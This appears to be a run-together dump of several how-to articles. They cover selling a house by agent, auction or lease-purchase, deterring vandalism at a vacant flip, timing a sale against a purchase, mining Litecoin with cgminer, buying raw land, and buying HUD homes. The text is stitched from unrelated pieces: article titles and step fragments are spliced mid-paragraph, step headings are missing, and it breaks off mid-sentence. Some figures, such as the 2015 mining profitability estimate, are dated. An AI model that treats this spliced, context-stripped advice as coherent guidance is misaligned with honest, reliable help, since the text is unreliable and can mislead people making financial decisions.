, The decision here rests on how much work and time you are willing to put into selling your house versus how much you can save by not paying an agent's commission. In addition, you'll want to consider how confident you are that you can get a good price on your home without an agent's help. Selling your own home requires a large amount of research to ensure that you're completing each step of the process correctly.


In some cases, the commission can be the deciding factor in whether or not a seller can afford to sell the property. Consider the housing market and your own financial situation before deciding whether or not to hire an agent., If you do decide to hire a real estate agent, be sure that you're choosing a good one who will get you the best price for your property. Start by asking friends and family for recommendations. This doesn't mean hiring someone you know who works as a real estate agent, but hiring an agent who acquaintances recognize as being a skilled negotiator and seller. Investigate his sales record and try to gauge whether or not he was able to get the sellers good prices.


In addition, don't just choose the agent with the lowest commission to save money. In many cases, a good agent will be able to get you more money, even after paying his fee., The primary difference between the two types lies in how offers on the property are made. In an auction, buyers are aware of other offers made on the house and can outbid each other to win the property. In a private sale, potential buyers make private offers for the property without knowing what other buyers are willing to pay. Either model can be beneficial to the seller, depending on the property itself, the seller's goals, and other external factors., The biggest benefit of selling at auction for most sellers is the knowledge that the price for a desirable property can be driven well above market by bidder competition. This is particularly valuable for properties that can't be easily priced on the regular market, like unique or historical homes. In addition, the auction gives the buyer the power to set when their home will be sold. The auction date provides a definite end to the selling process (provided the home sells at auction).Another consideration is that selling at auction can be cheaper than selling through an agent, particularly if you own a more valuable property. Auctioneers generally charge 1.5 to 4 percent of the sale price in commission, compared to agent's fees as high as 6 percent.This process also accelerates the selling process, as bidders are showing up prepared to buy. You won't have to schedule multiple showings of the house, and you know the house will sell at market value.Keep in mind that there are also auction sites that allow cooperation with a Realtor, so the option of an auction sale and a traditional sale would be open to you.

, A private sale can be more advantageous than an auction under the right circumstances. For one, it allows the seller a longer timeframe for considering offers. This gives you the time to consider whether or not the terms of each offer are really to your benefit. In addition, buyers make the offers on the home ""blind"" without the knowledge of what other buyers have offered. In some cases, this means that a particularly interested buyer seeking a quick deal may offer much more than expected (and much more than other buyers). Of course, there is no guarantee this will happen, but the same is true in an auction.As far as fees go, seller in a private sale may be cheaper if the seller chooses to do a FSBO. This way, the seller could avoid auctioneers fees., Agents are divided on this issue. Some believe that auctions always deliver higher prices while others like the security of private sales. In the end, it will depend on how many buyers and what types of buyers are interested in the home. If there are many interested and passionate buyers, an auction may spark competition and lead to a higher price. If not, a private sale may allow a buyer the chance to come in high with a good offer. Work with your agent or investigate the market yourself to try to figure out how much interest your home will receive and decide from there.Another consideration is time. An auction will help you get rid of a property in a set number of days if that is your goal. A private sale can take longer to close.Check with a real estate agent to find out the average time that a house was on the market in your neighborhood.

, A lease-purchase sale, also called a rent-to-own or lease-option sale, allows a potential home buyer to rent a property while simultaneously paying down the cost of the home. This gives him the option to buy the home for an agreed price at a specific date. The seller receives a down payment, usually around five percent of the home's value, at the agreement date and receives regular rent payments at a rate above the market rent on the property. The additional amount paid by the buyer goes towards paying down the value of the home in preparation of his future purchase.

, A lease-purchase can be a good choice in a difficult housing market where buyers are having difficulty securing financing for home purchases. This can help the seller reach a good sale price for her home while providing buyers a chance to purchase a home without financing. In addition, the seller usually sets the terms for the contract, allowing you to ensure that the terms are to your advantage. In addition, the seller is protected if the deal falls through. In this case, the seller still gets to keep the down payment and rent premiums.The seller also can continue to deduct mortgage interest payments from her income taxes while the home is being leased., Generally, this is only a good option if you can't get a good price for your home another way. Instead of actually selling your home and getting rid of it, you now have to deal with continued mortgage payments both on your old home (being leased) and your new home. However, the advantage is that if your buyer walks away during the lease period, you can keep the premiums and start again with your house at full value.It's also possible that, if the buyer walks away from the home during the lease period, you may be stuck with a loss in value. In any case, you will have to go through the selling process again., The seller can list the terms of the lease-purchase contract that they will accept, but the buyer will make an offer of their own. Then, the seller can either accept, deny, or renegotiate these terms. Look at similar houses around you being rented to determine a fair market rent price. Make sure this amount is higher than the mortgage payments you are making on the home so that they are covered by the buyer. In addition, make sure the sale price at the end of the lease term is reasonably higher than the current value (your house will be worth more in one to three years). Finally, look at the option fee (like a down payment) and negotiate a good amount that you feel comfortably compensates you for the risk and trouble of leasing your home.Your agent will draw up your lease-purchase contract, but then either escrow or an attorney will need to look at the contract and adjust the terms as needed. Hiring a lawyer can be expensive, but is worth it to prevent messy contract lawsuits.

Visit often.",How to Prevent Your Property from Being Vandalized While Flipping it," Houses that are waiting to be sold are prime targets for vandalism as vandals don't target occupied homes but rather those that are currently abandoned. Vandals will often destroy properties by breaking windows, busting holes in walls, and spray painting everything in sight. The professionals will even strip the copper piping and sell it for cash. Most noteworthy, perhaps, is the fact that most insurance policies to not cover vandalism after the first month that a property is abandoned or not lived in.;
, This may seem obvious, but many people fail to change the existing locks after purchasing. The house is at a greater risk if the property was purchased because of foreclosure, or from a short sale or an REO property. The previous homeowners might be disgruntled because they lost possession of their house or were forced to sell. If that is the case, they might take it out on the person who is trying to profit from their loss.


If you don't know how to replace locks yourself, have a professional locksmith come and do this for you. The money spent will be repaid by the much reduced chances of someone letting themselves back into the property.

, Sometimes, doors and windows do not have locks, especially for entrances to storage parts of the house, garage or a shed. In this case, it is wise to board up such doors or barricade them with furniture. If you've just installed new windows or a door trip however, you might not want to drive nails into them.

, Vandals do not generally hit houses that have people living in them. Therefore, it is a good idea to make the house appear to be occupied. By leaving the lights on inside, or at the very least outside the house, you can prevent people from breaking in.


If you're worried about the cost of the electricity bill, you could install motion sensor lights that only turn on when someone approaches the house.
If it's the holiday season, consider leaving some festive lights out on a timer, to have them showing at night. A few decorations in the front yard will add to the theme.

, Even if you leave the lights on, smart vandals are going to figure out the trick when they look in the windows and see that the inside is empty. To avoid this, buy some cheap drapes, or tape up some bedsheets to cover the windows. The element of mystery will scare away potential intruders.


If you have spare furniture, position it so that it can be seen if someone were to peer in through particular angles.

, Don't allow lawns to overgrow and keep hedges, plants and overhanging branches trimmed. Leave a few inexpensive items about to make it seem that the garden and yard are being tended, such as a watering can, a hose and an old wheelbarrow.


If you can't keep the garden tidy yourself, have a gardener call once a week to do this for you.
Keep flowering plants near the front door. Replace when they die off with cheap new ones. This gives the impression of someone living there and caring for plants.
Put in a meager vegetable plot to make it appear as if someone is tending to gardening. Add irrigation to keep it going while nobody tends to it much and do an occasional weed.

, This may not always be a practical thing to try to do but where your neighbors seem engaged in maintaining the community and keeping an eye out for vandalism, ask for their help. Give them your phone number and email contact so that they can let you know if something untoward is happening. Ask them to check the property as regularly as is convenient for them.


Buy your neighbors a calling card to reduce the costs of contacting you. Or give them something nice to say thank you for their help; this could even be an offer of your time to do some gardening or fence maintenance in return for their vigilance.

, You could ask the police for assistance, especially if you live in a neighborhood known for high property crime and damage. The officers will often be more than happy to help you out, as newly fixed up houses means neighborhood improvement and less crime for them to deal with.

, It may be extra money but if you have particular concerns about the possibility of vandalism, it will be money well spent to protect the property.

, Train yourself to notice anything unusual or changed about the property that hasn't anything to do with the renovations. By being constantly vigilant, you'll have a greater chance of keeping the property free of unwanted intruders.

Your lender will look at your finances and tell you whether you can carry an additional mortgage.Chances are, you won’t qualify to have two mortgages at once because your finances aren’t strong enough.Because of this, you’ll need to sell your home before you buy your next one.
If you can carry a second mortgage, then it’s up to you whether to sell your current home first or buy your second home first. Talk to your real estate agent and analyze the markets.;
, Your agent will help you assess whether you are selling into a hot or cold real estate market. The agent can also analyze the market you plan to buy into. You can find a real estate agent by looking in your phone book or talking to someone who has bought a home recently.


You might need to get a second agent, especially if you’re buying into a different city. You want someone with deep knowledge about local market conditions., You can’t develop a game plan until you understand both the market where you live and the market you hope to buy into.Talk to your agent but also do some independent research. Go onto websites such as Zillow and Trulia. Look at how long houses have been on the market and how often the price had to be lowered before the property sold.


In a hot market, homes shouldn’t be on the market more than 30 days, and they should fetch close to their asking price.
In a colder market, homes can stay unsold for months, even when the price is lowered.

, Things can move quickly when you’re buying into a hot market and selling into a hot market at the same time. You’ll have no trouble selling your home, but you’ll have to pay top dollar so you aren’t homeless for an extended length of time., When you’re buying into a cold market, you’ll have your pick of homes. You can choose to be picky and aggressive on price. However, it’ll be hard to sell your own home unless you’re willing to accept a low price. If you can’t get a second mortgage, you’re probably best off waiting to buy.


Speed up the sale of your current home by pricing it fairly. Get an appraisal so that you aren’t asking for too much., This is probably the best situation. You’ll have your pick of homes at competitive prices and can quickly offload your current home. You’ll probably only need temporary housing for a very short time.

, This is the worst combination to have.You’re definitely stuck with selling your current home first unless you can get a second mortgage. Even then, you must consider whether you want to carry two mortgages for a long time. You might not be able to sell your home for several months or longer.

, If you’re buying into a hot real estate market, include a contingency in your purchase and sale agreement to protect you. This contingency will state that you won’t purchase your new home unless your current one sells.If that contingency isn’t met, then you don’t have to go through on the home purchase.


Realize that a seller can turn you down. If their housing market is hot, they don’t need to wait around for you to sell your home. They may ask you to remove your contingency or turn down your offer altogether.However, this contingency can work if you’re buying into a cold market.When using the sale of your home as a contingency, it is possible to close on both properties on the same day, where the close of one loan’s proceeds is directly used towards the payment of the new home. It requires coordination from the lender to make sure both processes flow simultaneously.
This can get tricky when the buyer of the home you are leaving backs out due to inspection issues so it is best to make sure to have the home inspected and in good shape prior to making an offer with a property contingency.

, You might be afraid of selling before you buy and being left homeless. In this situation, you can include a contingency that you must close on your next home before the sale of your current home goes through.


Many potential buyers might balk at this. Basically, you’re asking them to put their lives on hold until you find your next home.
However, this contingency might work if you’re selling into a hot market.Because the housing supply is limited, buyers might feel they have no choice but to wait for you.

, If you’re selling into a hot market, you might not be able to close on a new home before you sell your current one. In this situation, you can include a “rent-back” provision. This provisions gives you the right to stay in the house for 60-90 days and pay rent after you sell.Lenders decide the length of the rent-back provision. Anything longer than 90 days and the property will be considered an investment property.The buyers will decide how much rent to charge you, and they’ll base it on either the mortgage payment or local market rents.

, You probably don’t qualify to carry two mortgages at once. If not, your lender will add a contingency to your mortgage. You’ll only get access to the loan funds once you close on the sale of your current home., Accept at the outset that this is a stressful process. It’s worrisome enough to sell a home or buy a home.Chances are you can’t time everything just right, which is why you have built contingencies into your contracts.


Handle the stress through exercise, eating well, and getting enough sleep at night.

, This is a do-it-yourself culture, and many people want to save a little money by cutting out professionals. Don’t. Meet early and often with your real estate agent, and let them stay on top of deadlines and paperwork requirements. Your agent is also an experienced negotiator, so trust them to sell a home in a cold market (or buy your next home in a hot one).

, You might want to avoid this option, but most people must sell their home first before they can buy their second. Get back-up housing to relieve stress.Talk to family and friends. Do they have space where you can stay? Is it reasonably close to your work?
You might need two places to stay. One parent can rent an apartment close to work while the children and the other parent move in with family during the summer. Try to be flexible.
Also research storage options.You probably can’t take all of your things with you to your temporary shelter.

, If you manage to buy your second home before selling your first, you might as well rent out your home to make money.This might be the only option if you’re trying to sell into a cold market.


Talk to current landlords so that you know what you’re getting into. Ask how they find good tenants, and ask to see a sample of their lease agreement.
Also consult with a landlord-tenant attorney. You must follow many laws as a landlord, so you’ll need expert legal advice.

, If you decide to carry two mortgages at once, you’ll need money to pay them.Similarly, if you need to move into temporary shelter, then you’ll need to pay for it. Save as much money as you can starting as soon as possible. If necessary, delay the home buying process until you have enough of a cushion.

, Let’s say you decide to buy first. You’ll need a loan to make your down payment on your second home. Ask friends and family first, and make the loan official by drafting a promissory note.However, you might need to ask your lender for a bridge loan.


Bridge loans are expensive and hard to get. Basically, you need to convince your lender you can carry two mortgages indefinitely."

Cryptocurrency such as Litecoin is generated by machines that solve complex algorithms. Whenever a ""block"" of algorithms is finished being processed, more currency is released into the market, usually as a reward to the miner that finished the block.Mining algorithms become more difficult as more currency is mined. This is intentional as it helps prevent all of the possible currency from being mined immediately. The practical side effect is that the longer you wait to start mining, the less likely you are to solve blocks on your own.
Mining pools were created to help individuals have a better chance at making money from mining. The mining pool applies all of its members' processing power to solving a block, and if the block is finished by any member, all members get a share of the reward. You'll get far less reward than if you finished the block on your own, but have much higher chances of actually seeing results.;
, Unless you're willing to drop thousands of dollars on a dedicated mining machine, or you don't pay for electricity and don't care about the lifespan of your home computer, there's very little reason to mine Litecoins instead of just purchasing them. The electricity costs of mining 24/7 often outweigh the value of anything you mine, especially if you're using a home computer, and running constantly puts a serious strain on your hardware components.Litecoin mining is only going to increase in difficulty, as this one of the fundamental principles of cryptocurrency mining. This means that it will get more difficult to mine at a profit unless the value of the Litecoin sees a significant boost.
If you're mining Litecoin to use as a speculative investment or to use an an alternative form of payment, it's usually better to just purchase them outright.

, In the cryptocurrency world, computers used to mine coins are called ""rigs"". In order to be remotely effective when mining Litecoins, you'll need a computer with at least two graphics cards. Ideally, you'll want four or five graphics cards attached in a custom setup. You can purchase these online, or you can try building your own, though this requires a fair amount more work than building a standard desktop computer.


You will want at least as much system RAM as graphics card RAM.
You'll want some specialized cooling for your mining computer to keep your components alive longer.

, These are dedicated mining machines that can greatly increase your mining power, but they can be expensive for effective ones. ASIC Scrypt miners can come in low-power models too, allowing you to save on electricity.One of the big benefits of a Scrypt miner is that you can easily change it to mine a more profitable coin as long it is Scrypt-based like Litecoin.
You can get a USB ASIC miner and connect it to a Raspberry Pi for a low-power miner.
ASIC Scrypt miners sell out quickly, but you can find them for purchase online at retailers such as Zeus Miner (zeusminer.com) and Zoom Hash (zoomhash.com). You may have to put your name on a waiting list for the more popular models.

, Once you've decided on some equipment, look up the market trends for Litecoin and make a projection on how much mining you will have to do to make up the cost of the equipment, power, and internet. If you can purchase the same number or more coins than you will earn mining, you're probably better off just buying the coins.For example, let's say that your equipment has a hash rate (processing power) of 200 KH/s, which is about the average for a high-end graphics card. The computer uses 600 watts of power to mine, and power costs $0.10/kWh. Assuming that you're mining solo, mining Litecoin at the current rate (March 2015) with the above setup will cost you $520 per year, and you would never break even.

, You will need this wallet to store the coins that you earn while mining, or any coins that you purchase or receive. You can download the Wallet program from litecoin.org. There are also official wallets available for mobile devices.


Download the Bootstrap file from here. This will save you about two days of waiting for your wallet to sync for the first time.
Encrypt your wallet by clicking ""Settings"" → ""Encrypt Wallet"". Give it a strong passphrase.

, There are a large number of mining pools out there, and it is highly recommended that new miners join a pool instead of trying to mine solo. When you mine solo, you have the chance to make big rewards for completing a block, but the chances of you specifically doing that are very, very low. A mining pool combines the efforts of everyone in the pool to complete the block, and then any rewards are split amongst the pool. You'll earn less for completed blocks, but have a much better chance at a a steady income.


When joining a pool, make sure that your wallet is linked to your account so that you can collect your earnings.

, A mining pools use a system called ""workers"". These workers are assigned to you, and represent the work you are doing while mining. The process for creating workers varies depending on the mining pool you join.


Many mining pools will create your first worker automatically when you register. The worker will typically be named ""username_1"" or ""username.1"".
Most beginner miners won't need more than one worker. You can create additional workers if you have multiple mining rigs. Typically you assign a worker to each piece of mining equipment you have, which allows you to track efficiency across your machines.

, There are several different mining programs available depending on your needs:


cgminer - This is a good all-around mining program. It was designed primarily for Bitcoin, but can mine Scrypt up to version 3.7.2.
cudaMiner - This is a mining program specifically for Nvidia graphics cards. You can download it here.
cpuminer - This is a mining program that is designed for use for CPU mining. This is much less efficient than using a graphics card, but for some it's the only way available. You can download it here.

, Different mining programs have different configuration processes. Below are instructions for setting up cgminer in Windows. You will need to know your mining pool connection details, including the ""stratum"" (address), port number, and your worker information. Your mining pool should have detailed instructions on configuring your miner for the pool.Extract cgminer to an easily accessible folder, such as C:\cgminer.
Press ⊞ Win+R and type cmd to open the command prompt. Navigate to the cgminer folder.
Type cgminer.exe -n to scan for your graphics card.
Open Notepad and type the following, using your mining pool information: start ""c:\cgminer"" --scrypt -o STRATUM:PORT -u WORKER -p PASSWORD

Click ""File"" → ""Save As"" and then save it as a "".bat"" file.

, Once your miner is configured and connected to your pool, you can begin the mining process. The command prompt window will display the results of your mining as it happens, such as the rate you are mining at and how much you've accomplished. Some miners will tell you the market value and your mining pool information as well.


Try to avoid running any other programs while the computer is mining. Anything else that you run will only hurt your miner's efficiency, which will lower your profits.

, Mining is very taxing on your hardware, as it constantly pushes it to its maximum limit. Make sure that you keep an eye on your temperatures to prevent any overheating, which can destroy your equipment.


While running your equipment 24/7 will give you the best mining results, it will also kill your hardware much quicker. You may want to consider powering down every once in a while.

, As you continue mining, check your power bills and computer costs and compare them against the coins you are earning through mining. If you aren't making a profit, you may want to consider selling your equipment to help recoup a potential loss.


Use online profit checking tools such as CoinWarz (coinwarz.com) to calculate up-to-the-minute profitability reports. Refer to your power bill to find your exact kW/h price, as well as the amount of power that you use each month.
If you've accumulated some powerful hardware and want to strike it rich, consider leaving your mining pool and mining solo. This should only be considered if you have a lot of experience mining in a pool, have a good grasp on the Litecoin market, and have a serious mining hardware setup (multiple server racks of ASIC miners, ideally in a climate-controlled environment). Make sure to use a profit calculator to ensure that mining solo will make financial sense.

Close on the property.",How to Buy Raw Land," Buying raw land is different than buying a home, and there are many questions a potential buyer needs to ask before starting the process. Some key questions include: Why are you buying this land? Are you hoping to build a home on the land? Are you planning to farm there, and set up a ranch house and agricultural plots? Are you buying it in hopes it increases in value over time? The answer to all these questions come with specific risks and considerations, and having specific plans for your land is necessary before you begin the process of looking.There are a variety of reasons people buy raw land, including:


Farming/ranching.
Building a house or home.
Diversifying one's portfolio.
Speculation (hoping the price will increase later).;
, Your budget will need to include money for several steps that most other land and home purchases do not, as well as the common expenses of purchasing land. Plan to include money for the following in your budget:


Due diligence. You will need to conduct a lot of research regarding the land you want to purchase that is usually not necessary for developed land.Down payment. If you are purchasing the land to develop a farm or ranch, you may be able to obtain specialized loans, such as those offered by the United States Department of Agriculture Farm Service Agency.Down payments tend to be higher for raw land purchases because things such as houses that banks could use as collateral for the loan do not exist on raw land. Your down payment may range between 20-50% of the total price of the property.Conversion. This includes the costs for anything you will need to do to convert the land for your intended use, such as constructing a home, running sewer lines, etc.
Carrying costs. This includes things such as the interest on your loan and any property taxes. Unlike residences, raw land is not considered to depreciate for federal tax purposes, so you can’t take a depreciation tax deduction for raw land.Just how much money does this work out to in dollar terms? Typically, for the down-payment and other costs, you should try to have about 20-25% of the purchase price available in cash as a rule of thumb. In addition, you should have a steady stream of income to cover carrying costs (like loan repayments). This will also help you qualify for any lending you may require. .

, Once you have determined what you want to use the land for and what your budget is, you can begin the search for available land in your price range that meets your requirements. There are a variety of ways in which to begin your search.


Scan local newspapers, query farmers in local rural communities, and research evictions, bank foreclosures, and tax sales.
Go through a real estate agent. This is a particularly good option when your search is somewhere out-of-state or far away from your current residence.A real estate agent may also be able to tell you whether there are any future zoning plans that could affect your own plans., You'll want to know what kind of properties you border, and whether industrial farming or agricultural practices will affect the value or livability of your land.You should also know whether the neighboring properties have any rights of way or easements on the land you’re considering., Two things that make land essentially useless are a lack of a septic system and/or a water source. These are the most important things to consider when investigating properties.Sewer systems are an important consideration. Off-the-grid land sometimes cannot be connected to a municipal sewer system, so when making purchasing decisions plan for a septic system. Make sure your property is not only zoned for septic, but has the space to install a septic system far enough away to avoid water contamination.Does your land have access to water? Trucking water is expensive and collecting rainwater is inefficient in most places. Make sure you have access and rights to water and, if you plan on digging a well, factor that into your decision as this can become quite expensive.

, The soil system of your land, and how/if you can reach it by road also determine its worth. Take topography and transportation seriously in the searching process.


Does your property have access to a road? If not, you should be willing and able to build one as inaccessible land is also essentially worthless. What is the climate like? If you're buying in an area with cold, snowy winters considering the type of road, if any, leading to your land is particularly important.
Once again, check carefully for any easements. An easement means you do not own 100% of your land, and it is possible that a utility company, or other landowner can regularly use your land. This could affect how you can use your land, as well as its success as an investment.
Consider electricity. If your property is far off the grid how do you plan on getting electricity to your location? You can pay the power company to string a pole in your direction, which can be expensive, or use alternative sources like wind or solar.
What is the topography of your land? Take notice of where water runs and if your land can support infrastructure. Watch for signs of flooding and know soil types and grade. Knowing your soil type also affects your ability to drill and set up a water source like a well, so make sure you factor in the added cost of drilling through something like rock as opposed to a softer soil like sand., Oftentimes, legal jargon and existing restrictions are difficult to comprehend. Unfortunately, certain restrictions based on zoning and environment can greatly impact the worth of your land and how you can use it.


Secure your rights. There are various rights that go into the purchase of raw land. For example, do you have the right to anything found on the land, such as land oil, natural gas, gold, or other valuable materials? Make sure to look into this ahead of time to save yourself a long, legal battle and possible loss of money. Also, consider hunting rights. Owning property, in some areas, gives you a right to refuse hunting on that land. Look into this ahead of time, and consider your own comfort and concerns on the issue of game hunting.
How is your land zoned? How and if the land is zoned affects your ability to build a home on your land. Check the land's zoning very closely before signing any paperwork, paying especially close attention to whether the land was previously zoned for anything that may depreciate its value over time. Industrial farming, for example, leaves chemical residues that sinks a land's value.
Check any existing environmental restrictions, especially if you are buying very rural land. Waterfronts and wetlands especially have a variety of strict guidelines about use and building, which are limiting for owner's plans. These could include, for example, an endangered species habitat. In addition, if you are planning on farming in any way beyond a simple home garden, you need to make sure your land is zoned for agricultural development., Before you begin looking into properties and contacting sellers, prepare a list of questions to ask based around your specific needs and wants to ensure the land is worth viewing. A few general questions to ask the seller or seller's agent include:


Is the lot buildable?
Are there any restrictions or encroachments on the property I should be aware of before purchasing?
Are there any common facilities, like water systems, septic systems, or roads, homeowners or developers need to manage? If so, what will my specific responsibilities be?
Will there be homeowner association fees?
Are any portions of the land designated wetlands or floodplain?
Does the site have access to electricity, natural gas, town water, or sewer?
Is there water on site? What is the flow rate and quality?, Nothing will clear up your ideas about what kind of land you want better than actually looking at some properties. You'll immediately realize what appeals to you, and what doesn't and you can weigh the pros and cons of purchasing that particular plot.


Look for any structures on the property or on a neighbor's property that cross the property line, and check with your city or county records office about the legality of such structures and what easements neighbors might have.
If you're working with an agent, the road you ride in on is likely the most attractive, easiest route to your property. However, it might not be accessible year-round or it may be prone to poor upkeep, plowing, and other services. Ask neighbors or those who live in the route you're taking, if it's always available, and whether it's cared for adequately.Talk to locals while you're there. Ask them if there is reliable cell phone reception in the area, what the seasons are like, what driving conditions are in the nearby roads and highways, and whether the area is prone to any specific environmental hazards.
If possible, stay overnight. Ask your agent if setting up camp is possible, and if this is allowed consider pitching a tent for an evening. This will give you the best idea of the daily rhythm of the area, and neighbors, and traffic - if after 24 hours your enthusiasm for the place has waned, imagine being there for 24 years.

, Because of the additional complexities of buying raw land, it is recommended that you consult with a lawyer once you’ve identified the property you want to buy. For one, a lawyer can help streamline communication between you and the seller so your rights as owner are clear. Additionally, your lawyer can help you interpret the findings of your due diligence and how it may affect your rights and use of the land. Find a qualified real estate attorney to help you navigate the pricing and other negotiations of the purchase process.


Before finalizing the sale, ask your lawyer whether water and mineral rights are a concern in the area. The jargon in regards to such issues, and what your rights are in regards to materials found on your property, can be confusing. A third party can help clear up any uncertainty.
Ask about what contingencies you should add to the bid offer, and how much time you need to address these contingencies. Contingencies are conditions that must be met before the closing will take place, such as financing, inspections, and insurance.Before finalizing your bid, ask your lawyer about building requirements and any permits you need, as well as whether there is a warranty deed. You should purchase owner's title insurance at this point. This is typically a seller cost, and requested in the offer as part of the contract., A down payment for raw land generally falls between 20-50% of the overall price, and many lenders expect you to have made a down payment before they consider granting you a mortgage loan. Do not be afraid to bargain with the seller. You can significantly reduce the overall cost with successful bargaining. Your offer should include an option on the land for a small fee, so that you have the opportunity to do due diligence before completing the purchase. Essentially, this will put the land on “hold” for you while you do your inspections. Alternatively, your offer can include a closing date (the date on which the purchase is completed) far enough into the future to complete the due diligence process.Your offer should also include provisions allowing you to walk away or buy the land for a reduced price depending on the findings of the due diligence process.
Cheaper properties make more financial sense when it comes to raw land as land tends to appreciate as it's developed. Look for relatively low-cost options that meet your needs as a buyer.
Inquire as to particular property tax savings programs in the state you're buying if you plan to leave the land undeveloped for a significant period of time. These plans can save you a lot of money long term, as taxes and payments are reduced over time on uncultivated land., Taking out a loan for raw land is tricky and much more difficult than getting a loan for an existing home. This is especially true if you plan to wait years to build. Banks fear the building plans will not come to fruition or you will walk away from the land if it does not appreciate in value.


You can minimize the risk of rejection by going in with a very specific plan, and proving you've done adequate research and practiced due diligence to assess the land for your personal needs. If you've contacted the above companies, departments, and professionals you're far more likely to look invested in your plans for the land and therefore be approved for a loan for a down payment.Work with local banks and credit unions. They're familiar with the area, and will know you're making a wise, well researched investment.Remember, your land is undeveloped so down payments and interest rates will be higher than for a typical home mortgage. Keep this in mind as you plan financially for your loan.Your credit score may also have to be higher to buy raw land as there is no building as collateral.

, Owner financing refers to you financing your land purchase through the seller (or owner) of the land. This can be an attractive option for buyers if they are having difficulty obtaining a bank loan, or if interest rates are too high due to poor credit. For the seller, it may be attractive if they are having difficulty selling the property. If these conditions apply, consider approaching the owner and inquiring about owner financing.For example, assume you wanted to buy a plot of land for $1 million. You would pay a down payment to the owner, and then the owner would finance the property and allow you to use the land. You would then pay the owner back regular payments just as you would with a bank loan. Typically, once all payments are complete, the deed to the land would be transferred to you.
Benefits of owner financing include lower costs for you (due to the lack of fees like closing fees, and a potentially lower interest rate), no qualifying required (since it is not through a bank), and fast closing of the sale (since there is no third party involved). There are a few risks to be aware of. Typically, these transactions will involve a relatively high down-payment of 20% or more. In addition, it is important to be aware of whether or not the seller still owes money on the land. If so, you are exposing yourself to the risk that the seller could go bankrupt and be unable to make payments. Bring this topic up with both the seller, and your lawyer, to fully understand the risks and what you can do about them.Always involve a lawyer when conducting this sort of transaction. Formal contracts will need to be created and signed, and a lawyer can help to make sure the transaction is fair to you and that the seller meets all their obligations. The lawyer can also assist with the financial aspects of the deal such as interest rates, amortization period, and documentation of the loan.

, It's impossible to identify and assess every sort of risk and delay, but pursuing a program of due diligence can minimize that risk. This usually means hiring several experts to conduct inspections and make inquiries on your behalf.


Due diligence takes time and money, which usually comes in the form of an inspection and feasibility study. Make sure to stipulate the amount of days needed to conduct the study and inspection in the offer.
The details of this period, and what rights you have during the process, are negotiated between you, the seller, and both of your respective agents. You may be asked to put down some form of financial deposit, sometimes known as earnest money, typically about 1% of the purchase price.

, Because due diligence is very expensive, you should request that the seller pay for at least part of your due diligence costs in case something comes up in the process that means you no longer wish to purchase the land.


These requests are generally presented with the offer.

, Even if the seller or real estate agent offers a survey of the land, contract your own surveyor or civil engineer as well. Rural plots can be uneven in size and shape and uninformed buyers or agents might miss certain pitfalls when surveying the land. Know the soil, the topography, the potential value, and where and how you can build.If you have the property surveyed then you may purchase extended title insurance which will protect you against boundary issues.

, A plat is a map, drawn to scale, of your land that shows the size, shape, and location of your property. Plats are not drawn by private entities, but public works departments and urban planning organizations. They are more informative and legally binding than the standard survey., Liens are notices attached to property that tell whether the owner owes money to a creditor. These are public record, and can be obtained from a county records office. A lien on a property can delay your purchase for months or years depending on the type of lien, so be aware., These departments can address specific questions about the land you're considering buying, and give you insight as to whether your building plans would work for the area.Ask the Building Office whether the lot is buildable, if there are any existing restrictions on the size of buildings, whether roads surrounding the property are publicly paved and maintained, and what permits, fees, and costs are required.
Ask the Planning and Zoning Office how and if the property is zoned, whether your planned use for the lot complies with zoning restrictions, whether there are any restrictions due to environmentally protected areas like wetlands, and how much lot coverage is allowed?, The health department can really solidify the specifics of any plans you have for wells and septic systems, and alert you to any potential dangers of installing them in the area.


Ask if tower service is available and what the costs are, what kind of septic systems are permitted, what tests are required, and what time of year they can be performed.
Look out for potential problems. Ask whether the area you're looking in has trouble with high water tables or poor soils for septic systems, and whether there are any known problems with water quality in your area., Utility companies can answer questions about access to electricity and other modern amenities. Check if natural gas can be brought to the lot, and what the costs are. What are the options for cell phones, internet, and television?

, Environmental restrictions can really throw a snag in building plans, so make sure you know of any going in. The DEP can answer these questions head on. You should also ask them to explain any former use of the land, specifically for environmental issues.


If you plan to install a well, speak to more than one driller and then check with the DEP to see if there are any well water issues in your immediate surrounding area. Asks about costs, flow rates, depth of neighboring wells, labor and material costs, and if there are any well water problems in neighboring areas., If your due diligence process does not reveal any major issues and your lawyer agrees that the purchase is a good one, close on your purchase. Depending on where you live, the procedures may vary, and your lawyer and real estate agent will walk you through them. In general, you can expect to see at least the following documents:A land contract. This lists the address of the property and includes a full legal description, including its location, any liens, easements, or other conditions, and the financial information such as purchase price, down payment amount, and number and amounts of monthly payments.
The deed. This transfers the legal title to the property from the seller to you. You will sign this when you close on the purchase.
A closing statement. An escrow officer or your lawyer can draft this document, which shows the debits and credits for you and the seller as agreed in the contract. For example, it may include an ""amortization schedule"" that specifies how many payments, in what amount, will pay off the amount you owe on the land.

However, buyers with lower levels of debt may be able to afford a monthly payments up to about 40 percent of their income. Take into account other expenses you may have to make sure you choose an amount that is comfortable. Realtors and realty listing sites usually offer mortgage calculators to determine what the monthly payment will be. These calculations are based on the down payment and interest.For more on calculating how much house you can buy, see how to determine how much house you can afford.;
, Narrow your home search by deciding on a general location first. Do you want to be in your city? Outside the city? In another location far from you? Then, think about whether you want a free-standing home or townhome and how large you want it to be. Consider the needs of your family if you have one. Write down any other qualities you want in a home, like an attached garage, fireplaces, or office space. These decisions will help you narrow your search and find a home that meets your needs., The easiest way to locate a HUD home is to get in touch with a real estate agent who is licensed to deal with them. These realtors often advertise in local newspapers or as HUD qualified agents. Additionally, listings for HUD homes are often placed in newspapers among regular home listings. The ad should have the name and contact information of the agent included.


If you check the paper and still don't see any HUD agents, consider calling a local real estate office and asking about HUD listings. If they don't have any, they may be able to refer you to another office that does., The listing broker, or any HUD-qualified broker, will be able to show you the house. Be sure to take photos of the property and take notes about any damages you see or changes you would make. This information can be used when comparing HUD homes or when calculating how much money you will need to borrow., HUD doesn't cover inspection costs or repairs, and no warranty is offered on a foreclosed home. It's important to have the property inspected by a professional to get an accurate estimate of necessary repairs and gauge the true value of the home. FHA inspectors can be found on the HUD website., For homes that need repair, HUD offers a rehabilitation loan program that covers the cost of repair. This loan, the FHA 203(k) Rehabilitation Loan, combines the costs of the home and the repairs into one, long-term mortgage loan. This is simpler than taking out separate loans for each expense., HUD offers discounted prices to teachers, firefighters, nonprofit groups, police and law enforcement officers, emergency service providers and other groups who seek to buy a home in designated areas (called revitalization areas). See the HUD website for more information on how to buy HUD foreclosures as part of this program., This allows for a smaller down payment, and protects the lender by paying off the mortgage if the buyer defaults. It also combines the insurance premium into the price of the home. Buyers must meet credit requirements and be able to afford the home in question to be considered., HUD properties are listed for a set period of time, usually ten days, called the initial listing 